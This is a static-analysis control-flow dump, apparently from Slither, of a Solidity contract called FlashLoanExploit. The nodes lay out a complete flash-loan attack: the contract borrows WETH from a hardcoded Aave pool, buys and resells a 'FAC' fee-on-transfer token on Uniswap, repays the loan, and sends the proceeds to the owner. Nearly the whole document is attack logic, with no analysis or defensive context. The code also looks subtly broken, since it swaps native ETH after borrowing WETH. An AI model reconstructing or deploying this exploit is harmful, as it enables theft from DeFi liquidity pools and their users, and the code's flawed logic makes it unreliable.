Contract: IUniswapV2Router02
==================================================


Contract: IERC20
==================================================


Contract: ILendingPool
==================================================


Contract: FlashLoanExploit
==================================================

Function: constructor
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: owner = msg.sender

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: uniswapRouter = IUniswapV2Router02(_uniswapRouter)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: facToken = _facToken

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: weth = _weth

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4

Function: startFlashLoan
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(msg.sender == owner,Only owner)

  ID: 2
  Type: NodeType.VARIABLE
  Expression: assets = new address[](1)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: assets[0] = weth

  ID: 4
  Type: NodeType.VARIABLE
  Expression: amounts = new uint256[](1)

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: amounts[0] = ethAmount

  ID: 6
  Type: NodeType.VARIABLE
  Expression: modes = new uint256[](1)

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: modes[0] = 0

  ID: 8
  Type: NodeType.VARIABLE
  Expression: params = abi.encode(ethAmount)

  ID: 9
  Type: NodeType.EXPRESSION
  Expression: lendingPool.flashLoan(address(this),assets,amounts,modes,address(this),params,0)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 7
  7 -> 8
  8 -> 9

Function: executeOperation
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(msg.sender == address(lendingPool),Unauthorized)

  ID: 2
  Type: NodeType.VARIABLE
  Expression: ethAmount = abi.decode(params,(uint256))

  ID: 3
  Type: NodeType.VARIABLE
  Expression: pathToBuy = new address[](2)

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: pathToBuy[0] = weth

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: pathToBuy[1] = facToken

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: uniswapRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: ethAmount}(0,pathToBuy,address(this),block.timestamp + 1200)

  ID: 7
  Type: NodeType.VARIABLE
  Expression: fac = IERC20(facToken)

  ID: 8
  Type: NodeType.VARIABLE
  Expression: facBalance = fac.balanceOf(address(this))

  ID: 9
  Type: NodeType.EXPRESSION
  Expression: fac.approve(address(uniswapRouter),facBalance)

  ID: 10
  Type: NodeType.VARIABLE
  Expression: pathToSell = new address[](2)

  ID: 11
  Type: NodeType.EXPRESSION
  Expression: pathToSell[0] = facToken

  ID: 12
  Type: NodeType.EXPRESSION
  Expression: pathToSell[1] = weth

  ID: 13
  Type: NodeType.EXPRESSION
  Expression: uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(facBalance,0,pathToSell,address(this),block.timestamp + 1200)

  ID: 14
  Type: NodeType.VARIABLE
  Expression: totalDebt = amounts[0] + premiums[0]

  ID: 15
  Type: NodeType.EXPRESSION
  Expression: IERC20(weth).approve(address(lendingPool),totalDebt)

  ID: 16
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 7
  7 -> 8
  8 -> 9
  9 -> 10
  10 -> 11
  11 -> 12
  12 -> 13
  13 -> 14
  14 -> 15
  15 -> 16

Function: receive
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

Edges:

Function: withdraw
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(msg.sender == owner,Only owner)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: address(owner).transfer(address(this).balance)

Edges:
  0 -> 1
  1 -> 2

Function: slitherConstructorVariables
------------------------------
Nodes:
  ID: 0
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: lendingPool = ILendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9)

Edges:


